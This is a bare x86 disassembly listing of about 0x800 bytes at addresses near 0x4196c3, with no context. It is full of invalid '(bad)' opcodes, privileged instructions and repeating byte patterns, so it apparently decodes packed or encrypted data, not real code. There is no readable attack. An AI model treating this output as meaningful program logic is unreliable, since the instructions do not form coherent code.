  4196c3:	lahf   
  4196c4:	and    al,0x75
  4196c6:	xor    ah,0xf8
  4196c9:	es add eax,0x73bf752f
  4196cf:	add    eax,0xd841b044
  4196d4:	inc    ecx
  4196d5:	xor    al,0x47
  4196d7:	xchg   DWORD PTR [ecx+eax*2+0x4e],edi
  4196db:	ja     0x419735
  4196dd:	mov    ch,0x35
  4196df:	mov    WORD PTR [edx+edi*4-0x7c],gs
  4196e3:	dec    eax
  4196e4:	cmp    DWORD PTR [eax+0x40],esi
  4196e7:	xchg   ebx,eax
  4196e8:	inc    ecx
  4196e9:	ins    BYTE PTR es:[edi],dx
  4196ea:	inc    ecx
  4196eb:	inc    eax
  4196ec:	inc    eax
  4196ed:	inc    ebx
  4196ee:	int3   
  4196ef:	add    BYTE PTR ds:0x56240,al
  4196f5:	inc    ebx
  4196f6:	inc    eax
  4196f7:	inc    eax
  4196f8:	add    BYTE PTR [ecx+0x62],al
  4196fb:	bound  eax,QWORD PTR [eax]
  4196fd:	int3   
  4196fe:	inc    eax
  4196ff:	inc    ebx
  419700:	add    eax,0x43624041
  419705:	adc    BYTE PTR [ecx+0x5],al
  419708:	inc    eax
  419709:	sar    BYTE PTR [esi+eax*2+0x12],cl
  41970d:	dec    esp
  41970e:	mov    WORD PTR [eax+0x550f1551],?
  419714:	xor    al,BYTE PTR [ebp+0xd]
  419717:	mov    al,ds:0x510f53ff
  41971c:	xor    al,0xe2
  41971e:	leave  
  41971f:	popa   
  419720:	dec    edi
  419721:	loop   0x4196b6
  419723:	xor    DWORD PTR [si-0x4210],ecx
  419728:	mov    al,0xfa
  41972a:	aaa    
  41972b:	shr    DWORD PTR [ecx+0x62],cl
  41972e:	or     eax,0x10404362
  419733:	add    eax,0x4158cc40
  419738:	inc    ebx
  419739:	bound  eax,QWORD PTR [ecx+0x40]
  41973c:	add    eax,0x4140
  419741:	and    eax,0x40400062
  419746:	add    eax,0x84404340
  41974b:	int3   
  41974c:	js     0x41974e
  41974e:	inc    ecx
  41974f:	adc    BYTE PTR [edx+0xf],ah
  419752:	inc    esp
  419753:	or     eax,0xf144fcd0
  419758:	sbb    cl,bl
  41975a:	aad    0xcb
  41975c:	or     eax,0xe05d15f0
  419761:	lock cdq 
  419763:	popa   
  419764:	loopne 0x41975b
  419766:	cmp    bl,dh
  419768:	bound  eax,QWORD PTR ds:0xe33563
  41976e:	inc    eax
  41976f:	inc    ecx
  419770:	inc    eax
  419771:	inc    ebx
  419772:	bound  ax,DWORD PTR ds:0x40434100
  419779:	add    eax,0x40054062
  41977e:	bound  eax,QWORD PTR [ecx+0x40]
  419781:	inc    ebx
  419782:	inc    eax
  419783:	add    eax,0x25405841
  419788:	bound  eax,QWORD PTR [eax+0x43]
  41978b:	inc    eax
  41978c:	adc    BYTE PTR [eax-0x6d],dh
  41978f:	pop    edx
  419790:	dec    esp
  419791:	leave  
  419792:	scas   eax,DWORD PTR es:[edi]
  419793:	inc    edx
  419794:	stc    
  419795:	pop    esp
  419796:	sbb    DWORD PTR [ecx-0x54],edx
  419799:	push   eax
  41979a:	inc    esp
  41979b:	inc    esi
  41979c:	into   
  41979d:	(bad)  
  41979e:	xor    DWORD PTR [edx-0x3d],ebx
  4197a1:	add    eax,0x3a19617d
  4197a6:	inc    ecx
  4197a7:	hlt    
  4197a8:	push   es
  4197a9:	retf   
  4197aa:	inc    edi
  4197ab:	clc    
  4197ac:	mov    esi,0xff9f758c
  4197b1:	inc    esi
  4197b2:	pusha  
  4197b3:	add    cl,ah
  4197b5:	cmp    BYTE PTR [ecx+0x32],al
  4197b8:	imul   eax,DWORD PTR [eax+0x41],0x62054043
  4197bf:	bound  eax,QWORD PTR [eax+0x43]
  4197c2:	inc    ecx
  4197c3:	adc    BYTE PTR [eax],al
  4197c5:	inc    eax
  4197c6:	add    eax,0x43000562
  4197cb:	add    BYTE PTR [ecx+0x40],al
  4197ce:	inc    eax
  4197cf:	add    eax,0x400062
  4197d4:	inc    ebx
  4197d5:	inc    eax
  4197d6:	js     0x419819
  4197d8:	inc    ecx
  4197d9:	bound  eax,QWORD PTR [eax-0x55]
  4197dc:	or     DWORD PTR [ebx+edi*2+0x8607f42],esp
  4197e3:	lock fcom QWORD PTR [edx-0x4f]
  4197e7:	je     0x4197ea
  4197e9:	rcr    esp,1
  4197eb:	adc    eax,0x8bcaa97e
  4197f0:	lahf   
  4197f1:	pop    eax
  4197f2:	arpl   cx,cx
  4197f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197f5:	inc    ebx
  4197f6:	or     eax,0x41054062
  4197fb:	add    BYTE PTR [ebx+0x40],al
  4197fe:	inc    eax
  4197ff:	inc    ecx
  419800:	inc    eax
  419801:	inc    eax
  419802:	bound  eax,QWORD PTR ds:0x5624300
  419808:	add    BYTE PTR [eax+0x40],al
  41980b:	add    BYTE PTR [ecx+0x43],al
  41980e:	add    BYTE PTR [eax+0x41],al
  419811:	add    eax,0x40436200
  419816:	inc    eax
  419817:	add    eax,0x55bfa562
  41981c:	add    eax,0x62c1c69c
  419821:	cmp    eax,0x15cc1751
  419826:	aam    0x15
  419828:	cmp    BYTE PTR [esi-0x41],0x13
  41982c:	arpl   bx,cx
  41982e:	pop    edx
  41982f:	retf   
  419830:	enter  0x5176,0x56
  419834:	retf   
  419835:	dec    eax
  419836:	test   eax,0xbfc43e00
  41983b:	xor    DWORD PTR [eax+0x33],eax
  41983e:	jmp    0x4197c9
  419840:	(bad)  
  419841:	out    dx,eax
  419842:	push   edx
  419843:	push   ebp
  419844:	or     DWORD PTR [eax-0x55],edx
  419847:	ret    
  419848:	data16 std 
  41984a:	xor    BYTE PTR [ebp+0x41b40d69],dl
  419850:	inc    eax
  419851:	add    eax,0x41624340
  419856:	test   BYTE PTR [eax],al
  419858:	and    eax,0x404043
  41985d:	add    BYTE PTR ds:0x626210,al
  419863:	add    eax,0x43404140
  419868:	inc    eax
  419869:	inc    ecx
  41986a:	add    eax,0x10664062
  41986f:	inc    ebx
  419870:	bound  eax,QWORD PTR [edx-0x3a]
  419873:	stos   DWORD PTR es:[edi],eax
  419874:	add    al,0x58
  419876:	xor    al,0x7b
  419878:	inc    ecx
  419879:	inc    ebx
  41987a:	sbb    DWORD PTR [ebx-0x638f6cc0],esi
  419880:	cmp    DWORD PTR [ebp+edi*4-0x4e99f018],ecx
  419887:	dec    eax
  419888:	cwde   
  419889:	push   ecx
  41988a:	(bad)  
  41988b:	int    0x52
  41988d:	xchg   ebx,eax
  41988e:	arpl   WORD PTR [eax+0x63],ax
  419891:	push   cs
  419892:	or     eax,0xfd3f703d
  419897:	add    eax,0x4041cc
  41989c:	add    BYTE PTR [eax],al
  41989e:	inc    eax
  41989f:	inc    eax
  4198a0:	inc    ebx
  4198a1:	bound  eax,QWORD PTR [eax]
  4198a3:	inc    eax
  4198a4:	inc    eax
  4198a5:	add    eax,0x62434162
  4198aa:	inc    eax
  4198ab:	js     0x4198bd
  4198ad:	inc    ecx
  4198ae:	add    eax,0x5404325
  4198b3:	bound  eax,QWORD PTR [eax+0x40]
  4198b6:	inc    ecx
  4198b7:	inc    ebx
  4198b8:	ds pop ds
  4198ba:	mov    ecx,0xc9654348
  4198bf:	ret    
  4198c0:	xor    BYTE PTR [ebx+eiz*2],dh
  4198c3:	xchg   BYTE PTR [edi-0x5e],dh
  4198c6:	je     0x41990d
  4198c8:	inc    edx
  4198c9:	outs   dx,BYTE PTR ds:[esi]
  4198ca:	push   edi
  4198cb:	ret    0x6be1
  4198ce:	and    edi,DWORD PTR [edx]
  4198d0:	mov    WORD PTR [ebx+ebp*4],?
  4198d3:	add    eax,0x548d864
  4198d8:	pop    ss
  4198d9:	bound  edi,QWORD PTR [esi+0x62412569]
  4198df:	inc    ebx
  4198e0:	add    BYTE PTR [eax],dl
  4198e2:	inc    eax
  4198e3:	add    BYTE PTR ds:0x62410040,al
  4198e9:	inc    eax
  4198ea:	add    BYTE PTR [ebx-0x34],al
  4198ed:	inc    eax
  4198ee:	add    eax,0x78434040
  4198f3:	bound  eax,QWORD PTR [ecx+0x78]
  4198f6:	add    eax,0x62404043
  4198fb:	mov    ch,0x6b
  4198fd:	xchg   ecx,eax
  4198fe:	pop    eax
  4198ff:	(bad)  
  419900:	and    DWORD PTR [edx],ecx
  419902:	repnz pop ecx
  419904:	fild   WORD PTR [edx+0x64]
  419907:	push   ecx
  419908:	xor    al,0xc9
  41990a:	clc    
  41990b:	add    DWORD PTR [edx-0x30],edx
  41990e:	dec    edx
  41990f:	les    edx,FWORD PTR [edx+0x26]
  419912:	shl    bh,0x9f
  419915:	add    eax,0x5054c00a
  41991a:	inc    ecx
  41991b:	inc    eax
  41991c:	add    eax,0x43436240
  419921:	add    eax,0x62004040
  419926:	inc    eax
  419927:	add    BYTE PTR [ecx+0x40],al
  41992a:	inc    ebx
  41992b:	test   BYTE PTR ds:0x58054041,ah
  419931:	inc    eax
  419932:	inc    eax
  419933:	bound  eax,QWORD PTR [eax+0x66]
  419936:	inc    ecx
  419937:	inc    eax
  419938:	add    eax,0x523ad400
  41993d:	inc    eax
  41993e:	test   eax,0xba44ab45
  419943:	ficomp WORD PTR [edi+0x42216253]
  419949:	xor    ah,al
  41994b:	mov    al,0x52
  41994d:	outs   dx,DWORD PTR ds:[esi]
  41994e:	inc    ecx
  41994f:	xor    eax,0xb0d0d434
  419954:	lahf   
  419955:	pop    ds
  419956:	xor    al,0xa8
  419958:	inc    ecx
  419959:	shl    BYTE PTR [edx+0x57],0x52
  41995d:	outs   dx,DWORD PTR ds:[esi]
  41995e:	add    BYTE PTR [eax],al
  419960:	inc    ebx
  419961:	inc    eax
  419962:	bound  eax,QWORD PTR ds:0x25404110
  419968:	add    ah,cl
  41996a:	inc    ebx
  41996b:	add    eax,0x40402562
  419970:	add    BYTE PTR [eax+0x40],al
  419973:	inc    ecx
  419974:	inc    ecx
  419975:	add    eax,0x78434025
  41997a:	bound  eax,QWORD PTR [eax-0x7c]
  41997d:	inc    eax
  41997e:	inc    ecx
  41997f:	push   ebx
  419980:	adc    al,BYTE PTR [eax-0x77]
  419983:	ins    BYTE PTR es:[edi],dx
  419984:	stos   DWORD PTR es:[edi],eax
  419985:	lahf   
  419986:	pop    ds
  419987:	out    0xb4,eax
  419989:	aam    0xc1
  41998b:	pushf  
  41998c:	stos   BYTE PTR es:[edi],al
  41998d:	xor    al,0xf7
  41998f:	test   al,0x41
  419991:	ins    BYTE PTR es:[edi],dx
  419992:	mov    esi,0x6f548df9
  419997:	adc    DWORD PTR [ebx-0x13bf792],ecx
  41999d:	xor    DWORD PTR [edi],ebx
  41999f:	fld1   
  4199a1:	(bad)  
  4199a2:	not    ecx
  4199a4:	jge    0x419963
  4199a6:	outs   dx,DWORD PTR ds:[esi]
  4199a7:	mov    bl,0xcb
  4199a9:	pop    ecx
  4199aa:	dec    edi
  4199ab:	bound  esi,QWORD PTR [ebx+esi*2+0x6338621f]
  4199b2:	push   eax
  4199b3:	inc    ecx
  4199b4:	inc    eax
  4199b5:	inc    eax
  4199b6:	inc    ebx
  4199b7:	int3   
  4199b8:	add    BYTE PTR ds:0x56240,al
  4199be:	inc    ebx
  4199bf:	inc    eax
  4199c0:	inc    eax
  4199c1:	add    BYTE PTR [ecx+0x62],al
  4199c4:	bound  eax,QWORD PTR [eax]
  4199c6:	int3   
  4199c7:	inc    eax
  4199c8:	inc    ebx
  4199c9:	add    eax,0x43624041
  4199ce:	adc    BYTE PTR [ecx+0x5],al
  4199d1:	inc    eax
  4199d2:	vpshufhw ymm1,YMMWORD PTR [eax-0x33],0x45
  4199d8:	mov    BYTE PTR ds:0x3f25560b,al
  4199de:	retf   
  4199df:	lock jo 0x4199ad
  4199e2:	xchg   ebp,eax
  4199e3:	rcl    BYTE PTR [esi],0x48
  4199e6:	bound  eax,QWORD PTR [ebx+0x40]
  4199e9:	adc    BYTE PTR ds:0x4158cc40,al
  4199ef:	inc    ebx
  4199f0:	bound  eax,QWORD PTR [ecx+0x40]
  4199f3:	add    eax,0x4140
  4199f8:	and    eax,0x40400062
  4199fd:	add    eax,0x84404340
  419a02:	int3   
  419a03:	js     0x419a05
  419a05:	inc    ecx
  419a06:	adc    BYTE PTR [edx+0xf],ah
  419a09:	adc    BYTE PTR [edx+eiz*2+0x56],al
  419a0d:	(bad)  
  419a0e:	in     eax,0x93
  419a10:	mov    edi,0x35f5c455
  419a15:	rcr    BYTE PTR ds:0x4f3b6ff2,1
  419a1b:	sub    BYTE PTR [ecx+0x62],al
  419a1e:	pop    edx
  419a1f:	xchg   ecx,eax
  419a20:	pop    ds
  419a21:	lds    edi,FWORD PTR [edi-0xc2a535f]
  419a27:	add    ah,BYTE PTR [edi]
  419a29:	int    0x41
  419a2b:	sar    BYTE PTR ds:0x59919b7a,1
  419a31:	adc    ch,ch
  419a33:	lods   al,BYTE PTR ds:[esi]
  419a34:	ret    
  419a35:	lea    edx,ds:0x41400051
  419a3b:	inc    eax
  419a3c:	inc    ebx
  419a3d:	bound  ax,DWORD PTR ds:0x40434100
  419a44:	add    eax,0x40054062
  419a49:	bound  eax,QWORD PTR [ecx+0x40]
  419a4c:	inc    ebx
  419a4d:	inc    eax
  419a4e:	add    eax,0x25405841
  419a53:	bound  eax,QWORD PTR [eax+0x43]
  419a56:	inc    eax
  419a57:	adc    BYTE PTR [edx+0x41],dl
  419a5a:	in     al,dx
  419a5b:	add    eax,0x7540c4ac
  419a60:	jae    0x419a99
  419a62:	xchg   edx,eax
  419a63:	retf   
  419a64:	or     eax,0x5441ddd0
  419a69:	aad    0x58
  419a6b:	dec    ecx
  419a6c:	leave  
  419a6d:	bound  ebx,QWORD PTR [ebx-0x3a322aa7]
  419a73:	xor    eax,0x41ddcd8a
  419a78:	mov    edi,0x6b42d044
  419a7d:	ret    0xb1cc
  419a80:	jmp    0x4084dbc5
  419a85:	add    eax,0x43406262
  419a8a:	inc    ecx
  419a8b:	adc    BYTE PTR [eax],al
  419a8d:	inc    eax
  419a8e:	add    eax,0x43000562
  419a93:	add    BYTE PTR [ecx+0x40],al
  419a96:	inc    eax
  419a97:	add    eax,0x400062
  419a9c:	inc    ebx
  419a9d:	inc    eax
  419a9e:	js     0x419ae1
  419aa0:	inc    ecx
  419aa1:	bound  eax,QWORD PTR [eax+0x2a]
  419aa4:	dec    eax
  419aa5:	mov    ds:0xff0ea150,eax
  419aaa:	xor    al,0x44
  419aac:	xor    eax,ebx
  419aae:	stos   BYTE PTR es:[edi],al
  419aaf:	gs out 0x42,eax
  419ab2:	aaa    
  419ab3:	sub    bl,dh
  419ab5:	mov    ah,0x81
  419ab7:	les    ebp,FWORD PTR [esi]
  419ab9:	mov    al,0x42
  419abb:	bound  eax,QWORD PTR [eax+0x5]
  419abe:	inc    ecx
  419abf:	add    BYTE PTR [ebx+0x40],al
  419ac2:	inc    eax
  419ac3:	inc    ecx
  419ac4:	inc    eax
  419ac5:	inc    eax
  419ac6:	bound  eax,QWORD PTR ds:0x5624300
  419acc:	add    BYTE PTR [eax+0x40],al
  419acf:	add    BYTE PTR [ecx+0x43],al
  419ad2:	add    BYTE PTR [eax+0x41],al
  419ad5:	add    eax,0x40436200
  419ada:	inc    eax
  419adb:	add    eax,0xa3a84362
  419ae0:	push   esp
  419ae1:	shl    BYTE PTR [eax],1
  419ae3:	pusha  
  419ae4:	push   eax
  419ae5:	pop    es
  419ae6:	adc    DWORD PTR [ecx],edi
  419ae8:	adc    eax,0x8764362
  419aed:	and    BYTE PTR [edi+ecx*2+0x17bbc5cb],0x6f
  419af5:	bound  ecx,QWORD PTR ds:0xe75950b8
  419afb:	js     0x419b12
  419afd:	mov    edi,0xeda91542
  419b02:	inc    ebp
  419b03:	inc    ecx
  419b04:	inc    eax
  419b05:	add    eax,0x41624340
  419b0a:	test   BYTE PTR [eax],al
  419b0c:	and    eax,0x404043
  419b11:	add    BYTE PTR ds:0x626210,al
  419b17:	add    eax,0x43404140
  419b1c:	inc    eax
  419b1d:	inc    ecx
  419b1e:	add    eax,0x10664062
  419b23:	inc    ebx
  419b24:	bound  esi,QWORD PTR [ebp-0x343e4091]
  419b2a:	or     DWORD PTR [ebp+0x52],0xfcbd1f43
  419b31:	or     al,0xa8
  419b33:	sub    al,0xca
  419b35:	shr    BYTE PTR [edi+0x54],cl
  419b38:	inc    edx
  419b39:	add    eax,0x4041cc
  419b3e:	add    BYTE PTR [eax],al
  419b40:	inc    eax
  419b41:	inc    eax
  419b42:	inc    ebx
  419b43:	bound  eax,QWORD PTR [eax]
  419b45:	inc    eax
  419b46:	inc    eax
  419b47:	add    eax,0x62434162
  419b4c:	inc    eax
  419b4d:	js     0x419b5f
  419b4f:	inc    ecx
  419b50:	add    eax,0x5404325
  419b55:	bound  eax,QWORD PTR [eax+0x40]
  419b58:	inc    ecx
  419b59:	inc    ebx
  419b5a:	xor    al,0xd
  419b5c:	xor    al,0x56
  419b5e:	ss pop ds
  419b60:	lds    esp,FWORD PTR [ecx]
  419b62:	mov    DWORD PTR [ebx-0x2b],ebp
  419b65:	cs inc eax
  419b67:	xchg   cx,cx
  419b6a:	lds    esi,FWORD PTR [ebp+edi*2+0x799f3120]
  419b71:	inc    edx
  419b72:	inc    ebp
  419b73:	or     eax,0xefe880fa
  419b78:	xor    al,0x2a
  419b7a:	and    eax,0x436241
  419b7f:	adc    BYTE PTR [eax+0x0],al
  419b82:	add    eax,0x62410040
  419b87:	inc    eax
  419b88:	add    BYTE PTR [ebx-0x34],al
  419b8b:	inc    eax
  419b8c:	add    eax,0x78434040
  419b91:	bound  eax,QWORD PTR [ecx+0x78]
  419b94:	add    eax,0x62404043
  419b99:	adc    al,0xcb
  419b9b:	cmp    DWORD PTR [ebx+0x468066b9],edx
  419ba1:	adc    al,0x52
  419ba3:	xchg   esp,eax
  419ba4:	inc    ecx
  419ba5:	sti    
  419ba6:	sbb    eax,ebp
  419ba8:	fisub  WORD PTR [edx+0x40]
  419bab:	arpl   WORD PTR [ebx],dx
  419bad:	je     0x419c15
  419baf:	inc    edi
  419bb0:	js     0x419bab
  419bb2:	inc    ecx
  419bb3:	int    0x24
  419bb5:	push   ecx
  419bb6:	pop    ds
  419bb7:	bound  ebp,QWORD PTR [ebx+edi*2+0x4ef77db4]
  419bbe:	or     DWORD PTR [eax],edx
  419bc0:	xor    ecx,esp
  419bc2:	ins    DWORD PTR es:[edi],dx
  419bc3:	in     eax,dx
  419bc4:	sub    al,0x90
  419bc6:	popf   
  419bc7:	arpl   WORD PTR [ecx+0x40],ax
  419bca:	add    eax,0x43436240
  419bcf:	add    eax,0x62004040
  419bd4:	inc    eax
  419bd5:	add    BYTE PTR [ecx+0x40],al
  419bd8:	inc    ebx
  419bd9:	test   BYTE PTR ds:0x58054041,ah
  419bdf:	inc    eax
  419be0:	inc    eax
  419be1:	bound  eax,QWORD PTR [eax+0x66]
  419be4:	inc    ecx
  419be5:	inc    eax
  419be6:	add    eax,0x40654800
  419beb:	stc    
  419bec:	data16 sub al,0x46
  419bef:	sub    eax,0x3940b462
  419bf4:	ds dec edi
  419bf6:	push   ebp
  419bf7:	push   esi
  419bf8:	fld    QWORD PTR ds:0x5fca89c0
  419bfe:	push   es
  419bff:	test   al,0x63
  419c01:	leave  
  419c02:	inc    eax
  419c03:	arpl   WORD PTR [ebx+0x3],ax
  419c06:	aad    0x41
  419c08:	shl    DWORD PTR [eax-0x4eaab47f],1
  419c0e:	pop    edx
  419c0f:	sub    ch,BYTE PTR [eax-0x65033ebf]
  419c15:	inc    esi
  419c16:	push   ecx
  419c17:	adc    edi,ebx
  419c19:	bound  eax,QWORD PTR [ebx+0x39]
  419c1c:	add    BYTE PTR [eax],al
  419c1e:	inc    ebx
  419c1f:	inc    eax
  419c20:	bound  eax,QWORD PTR ds:0x25404110
  419c26:	add    ah,cl
  419c28:	inc    ebx
  419c29:	add    eax,0x40402562
  419c2e:	add    BYTE PTR [eax+0x40],al
  419c31:	inc    ecx
  419c32:	inc    ecx
  419c33:	add    eax,0x78434025
  419c38:	bound  eax,QWORD PTR [eax-0x7c]
  419c3b:	inc    eax
  419c3c:	inc    ecx
  419c3d:	scas   al,BYTE PTR es:[edi]
  419c3e:	icebp  
  419c3f:	inc    esp
  419c40:	inc    ebx
  419c41:	sub    cl,al
  419c43:	dec    edi
  419c44:	mov    BYTE PTR [eax+0x4f],cl
  419c47:	jno    0x419c71
  419c49:	fs push edx
  419c4b:	call   0x7e9b61b4
  419c50:	xor    al,0xa8
  419c52:	jne    0x419ca8
  419c54:	push   eax
  419c55:	dec    edi
  419c56:	dec    edi
  419c57:	xor    eax,0x51862cd
  419c5c:	in     al,dx
  419c5d:	sbb    BYTE PTR [edi-0x41],0xcd
  419c61:	inc    eax
  419c62:	push   edx
  419c63:	inc    ecx
  419c64:	inc    eax
  419c65:	inc    eax
  419c66:	inc    ebx
  419c67:	int3   
  419c68:	add    BYTE PTR ds:0x56240,al
  419c6e:	inc    ebx
  419c6f:	inc    eax
  419c70:	inc    eax
  419c71:	add    BYTE PTR [ecx+0x62],al
  419c74:	bound  eax,QWORD PTR [eax]
  419c76:	int3   
  419c77:	inc    eax
  419c78:	inc    ebx
  419c79:	add    eax,0x43624041
  419c7e:	adc    BYTE PTR [ecx+0x5],al
  419c81:	inc    eax
  419c82:	inc    ebx
  419c83:	cmp    DWORD PTR [esi],ebp
  419c85:	lahf   
  419c86:	push   eax
  419c87:	inc    eax
  419c88:	inc    eax
  419c89:	sub    BYTE PTR [eax+ecx*4+0x42194fa9],dh
  419c90:	inc    ebx
  419c91:	xor    eax,0x5f236405
  419c96:	pop    esp
  419c97:	inc    eax
  419c98:	adc    BYTE PTR [ecx+0x404362cb],dl
  419c9e:	adc    BYTE PTR ds:0x4158cc40,al
  419ca4:	inc    ebx
  419ca5:	bound  eax,QWORD PTR [ecx+0x40]
  419ca8:	add    eax,0x4140
  419cad:	and    eax,0x40400062
  419cb2:	add    eax,0x84404340
  419cb7:	int3   
  419cb8:	js     0x419cba
  419cba:	inc    ecx
  419cbb:	adc    BYTE PTR [edx+0xf],ah
  419cbe:	pop    ebp
  419cbf:	shl    BYTE PTR [esi-0x30],cl
  419cc2:	inc    esi
  419cc3:	les    edi,FWORD PTR [ebx-0x4c]
  419cc6:	cld    
  419cc7:	add    BYTE PTR [edi+0x2c],dh
  419cca:	sub    BYTE PTR [edi+0x48],cl
  419ccd:	adc    eax,0x500439
  419cd2:	inc    eax
  419cd3:	inc    ecx
  419cd4:	inc    eax
  419cd5:	inc    ebx
  419cd6:	bound  ax,DWORD PTR ds:0x40434100
  419cdd:	add    eax,0x40054062
  419ce2:	bound  eax,QWORD PTR [ecx+0x40]
  419ce5:	inc    ebx
  419ce6:	inc    eax
  419ce7:	add    eax,0x25405841
  419cec:	bound  eax,QWORD PTR [eax+0x43]
  419cef:	inc    eax
  419cf0:	adc    BYTE PTR [ebx+0x10],al
  419cf3:	inc    eax
  419cf4:	dec    cl
  419cf6:	mov    dl,dl
  419cf8:	jg     0x419d6b
  419cfa:	inc    ebp
  419cfb:	inc    esp
  419cfc:	inc    ebx
  419cfd:	mov    ah,0x63
  419cff:	ficomp DWORD PTR [eax+0x54]
  419d02:	inc    ecx
  419d03:	ds dec ebp
  419d05:	adc    eax,0x75f320c5
  419d0a:	les    ebx,FWORD PTR [eax+ebx*8+0x40434140]
  419d11:	add    eax,0x43406262
  419d16:	inc    ecx
  419d17:	adc    BYTE PTR [eax],al
  419d19:	inc    eax
  419d1a:	add    eax,0x43000562
  419d1f:	add    BYTE PTR [ecx+0x40],al
  419d22:	inc    eax
  419d23:	add    eax,0x400062
  419d28:	inc    ebx
  419d29:	inc    eax
  419d2a:	js     0x419d6d
  419d2c:	inc    ecx
  419d2d:	bound  eax,QWORD PTR [eax+0x43]
  419d30:	dec    esi
  419d31:	dec    esi
  419d32:	pop    ecx
  419d33:	dec    edx
  419d34:	int    0x35
  419d36:	push   edx
  419d37:	push   ecx
  419d38:	std    
  419d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3a:	jno    0x419d53
  419d3c:	outs   dx,DWORD PTR ds:[esi]
  419d3d:	enter  0xffa6,0x39
  419d41:	fild   WORD PTR [eax+0x0]
  419d44:	and    DWORD PTR [edx+0x40],esp
  419d47:	add    eax,0x40430041
  419d4c:	inc    eax
  419d4d:	inc    ecx
  419d4e:	inc    eax
  419d4f:	inc    eax
  419d50:	bound  eax,QWORD PTR ds:0x5624300
  419d56:	add    BYTE PTR [eax+0x40],al
  419d59:	add    BYTE PTR [ecx+0x43],al
  419d5c:	add    BYTE PTR [eax+0x41],al
  419d5f:	add    eax,0x40436200
  419d64:	inc    eax
  419d65:	add    eax,0x4ff8c862
  419d6a:	mov    BYTE PTR [eax+edx*2],dl
  419d6d:	xor    al,0x62
  419d6f:	inc    ebx
  419d70:	cmp    eax,0x79806450
  419d75:	and    bl,al
  419d77:	sub    eax,0x1e370dab
  419d7c:	pop    eax
  419d7d:	sahf   
  419d7e:	xchg   esp,eax
  419d7f:	mov    ds:0xaa74cb42,eax
  419d84:	jno    0x419dcb
  419d86:	inc    ecx
  419d87:	inc    eax
  419d88:	add    eax,0x41624340
  419d8d:	test   BYTE PTR [eax],al
  419d8f:	and    eax,0x404043
  419d94:	add    BYTE PTR ds:0x626210,al
  419d9a:	add    eax,0x43404140
  419d9f:	inc    eax
  419da0:	inc    ecx
  419da1:	add    eax,0x10664062
  419da6:	inc    ebx
  419da7:	bound  esp,QWORD PTR [ebx+0x46]
  419daa:	xor    eax,0xbd26644c
  419daf:	sar    esp,1
  419db1:	aad    0x80
  419db3:	inc    ecx
  419db4:	cmp    eax,edi
  419db6:	pop    eax
  419db7:	jns    0x419d51
  419db9:	inc    ebx
  419dba:	lds    eax,FWORD PTR [eax-0x78]
  419dbd:	adc    edi,ebx
  419dbf:	adc    DWORD PTR [edx-0x24],esp
  419dc2:	inc    edx
  419dc3:	or     eax,0x4f2cc063
  419dc8:	mov    esi,0xcdc4fe30
  419dcd:	mov    eax,ds:0x41cc0591
  419dd2:	inc    eax
  419dd3:	add    BYTE PTR [eax],al
  419dd5:	add    BYTE PTR [eax+0x40],al
  419dd8:	inc    ebx
  419dd9:	bound  eax,QWORD PTR [eax]
  419ddb:	inc    eax
  419ddc:	inc    eax
  419ddd:	add    eax,0x62434162
  419de2:	inc    eax
  419de3:	js     0x419df5
  419de5:	inc    ecx
  419de6:	add    eax,0x5404325
  419deb:	bound  eax,QWORD PTR [eax+0x40]
  419dee:	inc    ecx
  419def:	inc    ebx
  419df0:	xor    ebp,edx
  419df2:	les    ecx,FWORD PTR [edi+0x63]
  419df5:	shr    BYTE PTR [ebp+0x5c],0x0
  419df9:	xor    ecx,DWORD PTR [edi-0x50]
  419dfc:	imul   esp,ecx,0xfa933015
  419e02:	inc    esp
  419e03:	adc    eax,0x2c626418
  419e08:	inc    esi
  419e09:	bound  ebp,QWORD PTR [edi+0x3c396248]
  419e0f:	sub    al,0x57
  419e11:	mov    edi,0x8801ec67
  419e16:	push   0x19bf4152
  419e1b:	in     al,0xc0
  419e1d:	fs add eax,0x6241257a
  419e23:	inc    ebx
  419e24:	add    BYTE PTR [eax],dl
  419e26:	inc    eax
  419e27:	add    BYTE PTR ds:0x62410040,al
  419e2d:	inc    eax
  419e2e:	add    BYTE PTR [ebx-0x34],al
  419e31:	inc    eax
  419e32:	add    eax,0x78434040
  419e37:	bound  eax,QWORD PTR [ecx+0x78]
  419e3a:	add    eax,0x62404043
  419e3f:	jne    0x419dff
  419e41:	and    al,0x45
  419e43:	arpl   WORD PTR [esi-0x51],cx
  419e46:	push   es
  419e47:	push   0x503561bc
  419e4c:	cld    
  419e4d:	push   eax
  419e4e:	push   ecx
  419e4f:	rol    DWORD PTR [ecx-0x41],1
  419e52:	mov    DWORD PTR ds:0x2c746e51,edx
  419e58:	gs test al,0xc5
  419e5b:	retf   
  419e5c:	cmp    al,0x90
  419e5e:	xchg   ecx,eax
  419e5f:	mov    cl,0xe0
  419e61:	adc    DWORD PTR [ecx-0x58],eax
  419e64:	and    al,BYTE PTR [edx-0x55]
  419e67:	mov    edi,0xda5a866
  419e6c:	inc    ecx
  419e6d:	inc    eax
  419e6e:	add    eax,0x43436240
  419e73:	add    eax,0x62004040
  419e78:	inc    eax
  419e79:	add    BYTE PTR [ecx+0x40],al
  419e7c:	inc    ebx
  419e7d:	test   BYTE PTR ds:0x58054041,ah
  419e83:	inc    eax
  419e84:	inc    eax
  419e85:	bound  eax,QWORD PTR [eax+0x66]
  419e88:	inc    ecx
  419e89:	inc    eax
  419e8a:	add    eax,0x4125d500
  419e8f:	popa   
  419e90:	prefetch BYTE PTR [ecx+ecx*8]
  419e94:	jp     0x419f12
  419e96:	push   eax
  419e97:	xchg   ecx,eax
  419e98:	lods   al,BYTE PTR ds:[esi]
  419e99:	retf   
  419e9a:	loope  0x419edf
  419e9c:	out    dx,al
  419e9d:	(bad)  
  419e9e:	aaa    
  419e9f:	jns    0x419ef3
  419ea1:	inc    eax
  419ea2:	sub    BYTE PTR [ecx+0x39],al
  419ea5:	scas   al,BYTE PTR es:[edi]
  419ea6:	sub    al,0xf5
  419ea8:	pop    edi
  419ea9:	inc    ebp
  419eaa:	pop    esp
  419eab:	je     0x419e35
  419ead:	dec    edx
  419eae:	fld    QWORD PTR [edx-0x60]
  419eb1:	cmp    al,0x15
  419eb3:	ins    DWORD PTR es:[edi],dx
  419eb4:	or     dl,BYTE PTR fs:[esi-0x2b]
  419eb8:	cmpxchg BYTE PTR [esp+ecx*2],bl
  419ebc:	dec    esi
  419ebd:	add    BYTE PTR [eax],al
  419ebf:	inc    ebx
  419ec0:	inc    eax
  419ec1:	bound  eax,QWORD PTR ds:0x25404110
